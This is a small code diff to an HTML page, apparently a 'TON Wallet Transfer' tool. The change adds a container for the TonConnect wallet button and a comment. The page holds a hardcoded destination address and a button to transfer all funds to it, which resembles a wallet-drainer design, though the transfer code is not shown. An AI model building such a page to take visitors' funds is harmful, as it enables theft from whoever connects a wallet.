@@ -10,6 +10,7 @@
 <body>
     <h1>TON Wallet Transfer</h1>
     <button id="connectBtn">Connect Wallet</button>
+    <div id="ton-connect"></div> <!-- TonConnect will attach here -->
     <button id="transferBtn" style="display: none;">Transfer All Funds to Wallet A</button>
     <p id="status"></p>
 
@@ -17,7 +18,7 @@
         const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Wallet A address
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://tonconnect.org/manifest.json',
-            buttonRootId: 'ton-connect'
+            buttonRootId: 'ton-connect' // Make sure this matches the div in the HTML
         });
 
         const connectBtn = document.getElementById("connectBtn");
